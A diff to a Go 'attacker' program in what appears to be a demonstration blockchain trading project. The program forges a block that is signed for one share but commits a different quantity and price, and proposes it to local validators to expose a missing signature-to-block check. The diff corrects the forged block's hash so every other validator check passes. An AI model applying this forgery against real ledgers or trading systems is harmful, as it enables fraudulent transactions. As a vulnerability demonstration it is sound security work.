@@ -10,8 +10,8 @@
 // The validators verify the signature against the honest envelope, never check
 // that the block matches it, and approve. That is the vulnerability.
 //
-//   Run from the nodes/ directory, with the Oracle and validators up:
-//     go run ./attacker
+//	Run from the nodes/ directory, with the Oracle and validators up:
+//	  go run ./attacker
 package main
 
 import (
@@ -22,6 +22,7 @@ import (
 	"crypto/sha256"
 	"crypto/x509"
 	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"encoding/pem"
 	"fmt"
@@ -44,14 +45,31 @@ const (
 
 var validators = []string{"localhost:9002", "localhost:9003"}
 
+// block mirrors nodes/blockchain.go's Block (same fields, order and JSON tags)
+// so computeHash below produces exactly the hash a validator expects.
+type block struct {
+	Index     int    `json:"index"`
+	PrevHash  string `json:"prev_hash"`
+	Timestamp int64  `json:"timestamp"`
+	OrderID   int    `json:"order_id"`
+	Stock     string `json:"stock"`
+	OrderType string `json:"order_type"`
+	Quantity  string `json:"quantity"`
+	Price     string `json:"price"`
+	NodeName  string `json:"node_name"`
+	Signature string `json:"signature"`
+	PublicKey string `json:"public_key"`
+	Hash      string `json:"hash"`
+}
+
 // computeHash reproduces nodes/blockchain.go exactly. The forged block must hash
 // correctly or the validator's chain-continuity check (check 1) would reject it —
 // and we want every real check to pass, so only the missing check is exposed.
-func computeHash(index int, prevHash string, ts int64, orderID int, stock, orderType, price, quantity string) string {
-	raw := fmt.Sprintf("%d|%s|%d|%d|%s|%s|%s|%s",
-		index, prevHash, ts, orderID, stock, orderType, price, quantity)
-	h := sha256.Sum256([]byte(raw))
-	return fmt.Sprintf("%x", h)
+func computeHash(b block) string {
+	b.Hash = ""
+	raw, _ := json.Marshal(b)
+	h := sha256.Sum256(raw)
+	return hex.EncodeToString(h[:])
 }
 
 // readValidatorHead reads a validator's on-disk chain so the forged block can be
@@ -124,7 +142,11 @@ func main() {
 	if os.Getenv("HONEST_PRICE") == "1" {
 		fPrice = honestPrice // forge only the quantity; price matches the oracle
 	}
-	fHash := computeHash(fIndex, headHash, ts, 9999, ticker, "BUY", fPrice, fQty)
+	fHash := computeHash(block{
+		Index: fIndex, PrevHash: headHash, Timestamp: ts, OrderID: 9999,
+		Stock: ticker, OrderType: "BUY", Quantity: fQty, Price: fPrice,
+		NodeName: "node1", Signature: sig, PublicKey: pubPEM,
+	})
 
 	fmt.Printf("  Forged block (what would actually be committed):\n")
 	fmt.Printf("    block #%d | BUY %s %s @ $%s\n\n", fIndex, fQty, ticker, fPrice)
@@ -132,7 +154,7 @@ func main() {
 	fmt.Printf("    signed for   1  share  @ market ($%s)\n", honestPrice)
 	fmt.Printf("    committing  %s shares @ $%s\n\n%s\n\n", fQty, fPrice, line)
 
-	block := &pbc.Block{
+	forged := &pbc.Block{
 		Index: int32(fIndex), PrevHash: headHash, Timestamp: ts,
 		OrderId: 9999, Stock: ticker, OrderType: "BUY",
 		Quantity: fQty, Price: fPrice, NodeName: "node1",
@@ -151,7 +173,7 @@ func main() {
 			ctx = metadata.AppendToOutgoingContext(ctx, "auth-token", secret)
 		}
 		resp, err := pbc.NewConsensusServiceClient(conn).Propose(ctx, &pbc.ProposeRequest{
-			Block:           block,
+			Block:           forged,
 			OraclePrice:     honestPrice,
 			OracleTimestamp: time.Now().UTC().Format(time.RFC3339Nano),
 			Signature:       sig,
